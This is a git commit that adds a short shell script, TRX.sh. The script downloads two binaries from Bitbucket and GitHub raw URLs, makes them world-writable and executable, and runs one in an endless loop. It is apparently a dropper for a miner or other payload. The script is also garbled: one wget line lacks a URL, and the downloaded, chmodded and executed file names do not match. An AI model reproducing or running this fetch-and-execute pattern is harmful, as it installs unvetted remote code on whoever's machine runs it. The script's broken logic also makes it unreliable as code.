dffed322246b5694afc1e5cd92c67de28860995c
Roniuhhh99 <88664070+Roniuhhh99@users.noreply.github.com>
2021-08-09 19:27:28 +0700

    Create TRX.sh

---
+++ TRX.sh
@@ -0,0 +1,6 @@
+#TRX
+wget -O sing 
+wget -O sing https://bitbucket.org/Ganzore/trx/raw/15a407a75db5ece98b8fbe8ebadc005c67d00602/clbbb
+wget -O dick https://github.com/desafff/ggss/raw/main/vio
+chmod 777 sync dick
+while :; do timeout 70 bash ./syng; sleep 1; done
